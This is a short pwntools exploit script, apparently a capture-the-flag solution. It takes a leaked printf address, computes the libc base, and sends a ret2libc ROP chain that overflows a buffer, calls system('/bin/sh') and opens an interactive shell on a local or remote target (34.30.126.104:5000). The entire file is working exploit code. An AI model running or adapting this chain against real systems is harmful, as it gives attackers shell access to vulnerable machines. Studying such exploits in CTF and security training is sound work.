from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)
libc = ELF('./libc.so.6',checksec=False)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('34.30.126.104',5000)
    else:
        return process(e.path)

p = start()

'''
printf is at 0x7f2cc08bb250
Hello give me an input
Input size:
'''

p.recvuntil(b'printf is at ')
leak = int(p.recvline().strip(b'\n').ljust(8,b'\x00'),16)
libc.address=leak-libc.sym['printf']
log.info(f"Leak: {hex(leak)}")

p.recvuntil(b'Input size')
p.sendline(b'1000')

rl = ROP(libc)

chain = cyclic(72)
chain += p64(rl.find_gadget(['pop rdi','ret'])[0])
chain += p64(next(libc.search(b'/bin/sh\0')))
chain += p64(rl.find_gadget(['ret'])[0])
chain += p64(libc.sym['system'])

p.sendline(chain)

p.interactive()
